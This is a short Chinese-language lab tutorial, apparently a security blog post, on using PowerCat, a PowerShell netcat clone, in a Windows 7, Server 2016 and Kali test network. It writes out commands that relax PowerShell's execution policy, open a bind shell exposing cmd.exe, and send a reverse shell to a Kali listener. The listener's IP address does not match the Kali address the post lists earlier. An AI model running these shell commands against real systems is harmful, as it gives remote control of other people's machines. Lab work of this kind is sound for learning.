**PowerCat是powershell版本的nc，PowerCat可以无缝的和Netcat连接。更加隐匿。**

##  **1.实验环境** ：

操作系统 IP

windows server2016： 10.10.3.6

windows 7 192.168.123.8 10.10.3.100

kali2020 192.168.123.234

 **条件：**

win7与server2016之间网络可达

win7与kali之间网络可达

kali与win2016网络不可达

（记得ping不通可能是防火墙策略）

运行-cmd，然后输入powershell

![1620012914_608f6f72e06bd5e3a8a97.png!small](https://image.3001.net/images/20210503/1620012914_608f6f72e06bd5e3a8a97.png!small)

输入命令‘Import-Module .\powercat.ps1’

如果出现以下情况，是因为权限问题

（powercat.ps1是PowerShell写的脚本文本，你可以在记事本中写一段PowerShell代码，然后将其保存为“xxx.ps1”，后面要使用它的时候，双击即可运行了，但windows默认不支持脚本文件，需要进行处理。）

![1620012965_608f6fa5df4cb7c71de2a.png!small](https://image.3001.net/images/20210503/1620012965_608f6fa5df4cb7c71de2a.png!small)

输入命令“Set-ExecutionPolicy remotesigned” ，然后输入“y”提升权限

（会存在需要管理员权限进行操作，以管理员运行cmd即可）

再次输入命令‘Import-Module .\powercat.ps1’

![1620012992_608f6fc00fdd850fa1cdc.png!small](https://image.3001.net/images/20210503/1620012992_608f6fc00fdd850fa1cdc.png!small)

输入 “powercat -h”

![1620013007_608f6fcf0987980eae16b.png!small](https://image.3001.net/images/20210503/1620013007_608f6fcf0987980eae16b.png!small)

## 2.通过netcat正向链接powercat

win7：powercat -l -p 8888 -e cmd.exe -v

![1620013135_608f704f537520ef693f2.png!small](https://image.3001.net/images/20210503/1620013135_608f704f537520ef693f2.png!small)

kali：netcat 192.168.123.8 8888 -vv 正向链接成功

![1620013150_608f705e6a7c775995c29.png!small](https://image.3001.net/images/20210503/1620013150_608f705e6a7c775995c29.png!small)

## 3.反向链接：

kali：netcat -l -p 8888 -vv

win7：powercat -c 192.168.123.134 -p 8888 -v

通过win7向kali传输数据。

![1620013213_608f709d6fda2e8090f4c.png!small](https://image.3001.net/images/20210503/1620013213_608f709d6fda2e8090f4c.png!small)

（中文乱码：待解决）

![1620013227_608f70ab1c16f502142a6.png!small](https://image.3001.net/images/20210503/1620013227_608f70ab1c16f502142a6.png!small)

kali：netcat -l -p 8888 -vv

win7：powercat -c 192.168.123.134 -p 8888 -v -e cmd.exe

![1620013245_608f70bdc802f1cc9b804.png!small](https://image.3001.net/images/20210503/1620013245_608f70bdc802f1cc9b804.png!small)

![1620013259_608f70cb38f7e105893e9.png!small](https://image.3001.net/images/20210503/1620013259_608f70cb38f7e105893e9.png!small)

感谢 **余师傅** 的虚拟机（省下了很多时间去安装）

powercat后续有一些功能：传输，生成payload，跳板下次更新。（主要是环境有一些问题哈哈）

大家五一快乐！！！！

